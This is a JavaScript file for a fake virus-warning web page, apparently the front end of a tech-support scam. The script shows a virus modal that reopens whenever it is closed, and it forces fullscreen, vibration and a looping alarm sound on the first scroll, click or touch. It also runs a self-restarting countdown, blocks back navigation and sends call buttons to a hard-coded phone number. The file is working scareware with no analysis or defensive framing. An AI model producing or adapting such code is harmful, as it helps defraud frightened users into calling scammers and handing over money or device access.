$(document).ready(() => {
  // Countdown timer logic
  function startCountdown() {
    let timeInSeconds = 5 * 60; // 5 minutes in seconds

    const countdown = setInterval(() => {
      let minutes = Math.floor(timeInSeconds / 60);
      let seconds = timeInSeconds % 60;

      // Format minutes and seconds to always show 2 digits
      minutes = minutes < 10 ? "0" + minutes : minutes;
      seconds = seconds < 10 ? "0" + seconds : seconds;

      // Update the timer display
      $("#countdown-timer").text(`${minutes}:${seconds}`);

      timeInSeconds--;

      if (timeInSeconds < 0) {
        clearInterval(countdown);
        startCountdown(); // Restart the countdown
      }
    }, 1000);
  }

  // Start the countdown
  startCountdown();

  const virusModal = document.getElementById("virusModal");
  const modalInstance = new bootstrap.Modal(virusModal);
  const audioPlayer = $("#audioPlayer")[0];

  // Ensure audio plays and loops
  function playAudio() {
    audioPlayer.play().catch((error) => {
      console.error("Audio playback was blocked:", error);
    });
    audioPlayer.addEventListener("ended", () => {
      audioPlayer.play();
    });
  }

  // Function to go fullscreen and vibrate
  function goFullScreenAndVibrate() {
    const element = document.documentElement; // Use the entire document for fullscreen

    if (element.requestFullscreen) {
      element.requestFullscreen();
    } else if (element.mozRequestFullScreen) {
      element.mozRequestFullScreen(); // Firefox
    } else if (element.webkitRequestFullscreen) {
      element.webkitRequestFullscreen(); // Chrome, Safari, Opera
    } else if (element.msRequestFullscreen) {
      element.msRequestFullscreen(); // IE/Edge
    }

    navigator.vibrate(200); // Vibrate
    playAudio(); // Play the audio
    modalInstance.show(); // Show the modal
  }

  // Automatically show modal on scroll
  let scrolledOnce = false;
  $(window).on("scroll", () => {
    if (!scrolledOnce) {
      scrolledOnce = true;
      goFullScreenAndVibrate();
    }
  });

  // Ensure the modal keeps reappearing after being closed
  if (virusModal) {
    virusModal.addEventListener("hidden.bs.modal", () => {
      setTimeout(() => {
        modalInstance.show(); // Reopen modal
        goFullScreenAndVibrate(); // Trigger fullscreen and vibrate
      }, 300); // Delay of 0.3 seconds
    });
  }

  // Handle touchstart and click events to trigger fullscreen
  $(window).on("touchstart click", () => {
    playAudio(); // Play audio
    goFullScreenAndVibrate(); // Ensure fullscreen and vibration
  });

  // Call button functionality
  $("#callButton, #callButton1, #callButton2").on("click", function () {
    const phoneNumber = "tel:+18778381219";
    window.location.href = phoneNumber;
  });

  // Prevent backspace key from navigating back
  history.pushState(null, null, window.location.href);
  window.onpopstate = () => history.forward();
});
